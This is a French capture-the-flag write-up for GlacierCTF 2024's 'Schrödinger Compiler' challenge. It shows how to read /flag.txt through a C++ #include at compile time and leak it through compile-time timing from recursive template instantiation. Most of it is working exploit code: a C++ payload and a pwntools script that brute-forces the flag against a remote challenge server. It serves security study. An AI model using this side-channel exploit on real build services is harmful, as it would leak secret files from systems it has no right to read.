---
title: "Schrödinger Compiler - GlacierCTF 2024"
lastUpdated: 2024-11-23T00:00:00.000Z
draft: false
math: true
tags:
  - Time Attack
  - C++
  - GlacierCTF
  - Side Channel
author: "Garab"
---


## Writeup du Challenge GlacierCTF : Schrödinger Compiler

### Vue d'ensemble du Challenge

Ce challenge fournit un service de compilation distant qui compile notre code C++ mais ne l'exécute pas. L'objectif est d'exfiltrer le flag depuis `/flag.txt` en utilisant uniquement des canaux auxiliaires au moment de la compilation.

### Le Script du Challenge

```sh
#!/bin/sh

echo "[+] Welcome to the Schrödinger Compiler"
echo "[+] We definitely don't have a flag in /flag.txt"
echo "[+] Timeout is 3 seconds, you can run it locally with deploy.sh"

echo ""

echo "[+] Submit the base64 (EOF with a '@') of a .tar.gz compressed "
echo "    .cpp file and we'll compile it for you"
echo "[+] Example: tar cz main.cpp | base64 ; echo \"@\""
echo "[>] --- BASE64 INPUT START ---"
read -d @ FILE
echo "[>] --- BASE64 INPUT END ---"

DIR=$(mktemp -d)
cd ${DIR} &> /dev/null
echo "${FILE}" | base64 -d 2>/dev/null | tar -xzO > main.cpp 2> /dev/null
echo "[+] Compiling with g++ main.cpp &> /dev/null"
g++ main.cpp

# ./main
# oops we fogot to run it
echo "[+] Bye, it was a pleasure! Come back soon!"
```

## Stratégie d'Exploitation

### Étape 1 : Charger le Flag au Moment de la Compilation

Observation clé : le script **compile** notre code mais ne l'**exécute** pas. Cependant, on peut toujours accéder aux fichiers pendant la compilation !

Le préprocesseur C++ permet d'inclure des fichiers comme littéraux de chaîne :

```cpp
const char * myString = {
    #include "/flag.txt"
};
```

Cela charge `/flag.txt` dans `myString` **au moment de la compilation**, avant que le programme ne soit jamais exécuté.

### Étape 2 : Le Problème - Pas de Canal de Sortie

Puisque notre binaire compilé n'est jamais exécuté, on ne peut pas utiliser les I/O traditionnelles. On a besoin d'un canal auxiliaire observable pendant la compilation elle-même.

**Solution : Attaque Temporelle**

On peut faire en sorte que le compilateur effectue une quantité variable de travail en fonction du contenu du flag. En mesurant le temps de compilation, on peut fuiter l'information octet par octet.

### Étape 3 : Créer des Délais à la Compilation

L'idée : Créer du code C++ qui prend significativement plus de temps à compiler quand notre supposition est **incorrecte**, et compile rapidement quand notre supposition est **correcte**.

On utilise la **métaprogrammation par templates** pour créer des délais à la compilation. Les templates sont instanciés pendant la compilation, et l'instanciation récursive de templates force le compilateur à effectuer un travail exponentiel :

```cpp
#include <format>
#include <cstdio>
#include <type_traits>
#include <string>
#include <iostream>

// Charger le flag au moment de la compilation
static constexpr const char * myString = {
    #include "/flag.txt"
};

// Template factorielle pour créer du travail
template<int N>
struct Factorial {
    static const int value = N * Factorial<N - 1>::value;
};

template<>
struct Factorial<0> {
    static const int value = 1;
};

// Template récursif pour créer des délais à la compilation
template <int N>
struct CompileTimeDelay {
    static void delay() {
        // Forcer l'instanciation du template (crée du travail pour le compilateur)
        std::cout << Factorial<10>::value << std::endl;
        CompileTimeDelay<N - 1>::delay();  // Récursion N fois
    }
};

// Cas de base : arrêter la récursion
template <>
struct CompileTimeDelay<0> {
    static void delay() {
        // Pas de travail nécessaire
    }
};

#define COMPILE_DELAY(N) \
    static_assert(N == 0 || N > 0, "Invalid delay value"); \
    CompileTimeDelay<N>::delay();

int main() {
    // Si myString[0] != 'g', délai de 800 itérations
    // Sinon, délai de 0 itérations (instantané)
    COMPILE_DELAY(myString[0] - 'g' ? 800 : 0);
    return 0;
}
```

**Comment ça marche :**

- Si `myString[0]` ≠ `'g'` : L'expression ternaire s'évalue à `800`, instanciant `CompileTimeDelay<800>` jusqu'à `CompileTimeDelay<0>`, créant un travail massif à la compilation
- Si `myString[0]` = `'g'` : L'expression s'évalue à `0`, compilant instantanément avec `CompileTimeDelay<0>`

**Résultats de timing :**
- Mauvaise supposition : ≈ 1,0 seconde de temps de compilation
- Bonne supposition : ≈ 0,3 seconde de temps de compilation

Cette différence de 0,7 seconde est facilement mesurable même à travers le réseau !

## Implémentation

### Extraction Automatisée du Flag

On automatise l'attaque en testant chaque caractère et en mesurant le timing :

```python
from pwn import *
import os
import subprocess
import time
import string

chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}"
context.log_level = 'warning'

# Code template (identique à ci-dessus)
text = '''
#include <format>
#include <cstdio>
#include <type_traits>
#include <string>

static constexpr const char * myString = {
    #include "/flag.txt"
};

#include <iostream>

//template factorial
template<int N>
struct Factorial {
    static const int value = N * Factorial<N - 1>::value;
};

template<>
struct Factorial<0> {
    static const int value = 1;
};

template <int N>
struct CompileTimeDelay {
    static void delay() {
        // Recursive unrolling: "doing work"
        std::cout << Factorial<10>::value << std::endl;
        CompileTimeDelay<N - 1>::delay();
    }
};

// Specialization to stop recursion when N == 0
template <>
struct CompileTimeDelay<0> {
    static void delay() {
        // factorial of 10
        // Base case: no recursion, effectively instant for N=0
    }
};

#define COMPILE_DELAY(N) \\
    static_assert(N == 0 || N > 0, "Invalid delay value"); \\
    CompileTimeDelay<N>::delay();

'''

flag = 'gctf{'  # Préfixe connu du flag
i = len(flag)

while True:
    char_to_time = []

    # Essayer chaque caractère possible
    for c in chars:
        re = remote('78.47.52.31', 4126)
        re.recvuntil(b'BASE64 INPUT START ---\n')

        # Générer du code qui fait un délai si myString[i] != c
        main_code = '''
int main() {
    COMPILE_DELAY(myString[%d] - '%c' ? 800 : 0);
    return 0;
}
''' % (i, c)

        # Écrire le fichier C++ complet
        with open('to_compile.cpp', 'w') as f:
            f.write(text + main_code)

        # Empaqueter et envoyer
        cmd = 'tar cz to_compile.cpp | base64'
        result = subprocess.check_output(cmd, shell=True)
        re.sendline(result)
        re.sendline(b'@')

        # Mesurer le temps de compilation
        timestart = time.time()
        re.recvall()
        elapsed = time.time() - timestart

        print(f"{c}: {elapsed:.2f}s")

        # Si la compilation était rapide, on a trouvé le caractère !
        if elapsed < 0.5:
            char_to_time.append((c, elapsed))
            re.close()
            break

        char_to_time.append((c, elapsed))
        re.close()

    # Passer au caractère suivant
    i += 1
    char_to_time.sort(key=lambda x: x[1])
    print(f"Timings: {char_to_time[:3]}")

    # Ajouter le caractère le plus rapide (correct) au flag
    flag += char_to_time[0][0]
    print(f"Flag jusqu'ici: {flag}")
```

**Comment fonctionne l'exploit :**

1. Commencer avec le préfixe connu `gctf{`
2. Pour chaque position inconnue $i$ :
   - Essayer chaque caractère $c$ dans le jeu de caractères
   - Mesurer le temps de compilation pour `myString[i] - c ? 800 : 0`
   - La compilation la **plus rapide** révèle le caractère correct
3. Répéter jusqu'à avoir le flag complet

## Pour Aller Plus Loin

Si vous êtes intéressé par les concepts utilisés dans cette attaque, voici quelques ressources utiles :

- [Template Metaprogramming](https://en.wikipedia.org/wiki/Template_metaprogramming) - Wikipedia
- [Timing Attacks](https://en.wikipedia.org/wiki/Timing_attack) - Cryptanalyse par canal auxiliaire
- Article original de Paul Kocher sur les attaques temporelles (1996) : [Timing Attacks on Implementations of Diffie-Hellman, RSA, DSS, and Other Systems](https://paulkocher.com/doc/TimingAttacks.pdf)
